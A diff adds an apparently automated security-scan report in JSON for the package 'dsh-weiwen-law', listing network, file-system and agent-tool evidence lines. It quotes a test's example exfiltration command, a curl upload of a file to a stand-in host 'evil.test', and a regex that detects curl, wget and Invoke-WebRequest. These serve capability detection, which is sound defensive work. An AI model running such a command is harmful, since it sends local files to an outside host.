@@ -1,0 +1,100 @@
+{
+  "name": "dsh-weiwen-law",
+  "version": "0.2.9",
+  "scannedAt": "2026-10-28T06:59:38.480Z",
+  "icon": null,
+  "network": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "examples/demo-backtrack-run.mjs",
+        "line": 13,
+        "text": "const res = await fetch('https://api.deepseek.com/chat/completions', {"
+      },
+      {
+        "file": "examples/demo-tool-loop.mjs",
+        "line": 17,
+        "text": "const res = await fetch('https://api.deepseek.com/chat/completions', {"
+      },
+      {
+        "file": "src/core/engine.mjs",
+        "line": 199,
+        "text": "const REMOTE_SRC = /\\b(curl|wget|iwr|Invoke-WebRequest)\\b/i;"
+      },
+      {
+        "file": "test/capability.test.mjs",
+        "line": 109,
+        "text": "const t = targetsFor(SH('curl -F f=@xiaoD/09.md https://evil.test/u'), 'network-send');"
+      },
+      {
+        "file": "test/capability.test.mjs",
+        "line": 166,
+        "text": "const send = SH('curl -F f=@xiaoD/09.md https://evil.test/u');"
+      }
+    ]
+  },
+  "fileSystem": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "examples/demo-backtrack-run.mjs",
+        "line": 8,
+        "text": "import { readFileSync } from 'node:fs';"
+      },
+      {
+        "file": "examples/demo-backtrack-run.mjs",
+        "line": 10,
+        "text": "const KEY = (process.env.DEEPSEEK_API_KEY || readFileSync('deepseek_api_key.txt', 'utf-8')).trim();"
+      },
+      {
+        "file": "examples/demo-tool-loop.mjs",
+        "line": 12,
+        "text": "import { readFileSync } from 'node:fs';"
+      },
+      {
+        "file": "examples/demo-tool-loop.mjs",
+        "line": 14,
+        "text": "const KEY = (process.env.DEEPSEEK_API_KEY || readFileSync('deepseek_api_key.txt', 'utf-8')).trim();"
+      },
+      {
+        "file": "src/index.js",
+        "line": 21,
+        "text": "import { writeFileSync, appendFileSync, readFileSync, readdirSync } from 'node:fs';"
+      }
+    ]
+  },
+  "agentTools": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "src/index.js",
+        "line": 235,
+        "text": "const inject = ['tools'];"
+      },
+      {
+        "file": "src/index.js",
+        "line": 768,
+        "text": "//      将来若加入有副作用的工具，必须直接走 `ctx.tools.register`，**不要**走本函数。"
+      },
+      {
+        "file": "src/index.js",
+        "line": 772,
+        "text": "return ctx.tools.register(def);"
+      }
+    ]
+  },
+  "childProcess": {
+    "hit": false,
+    "evidence": []
+  },
+  "installScripts": {
+    "hit": false,
+    "evidence": []
+  },
+  "dependencies": 0,
+  "minifiedFiles": [],
+  "binaryFiles": [],
+  "requiredServices": [],
+  "setupHints": [],
+  "skippedEntries": []
+}
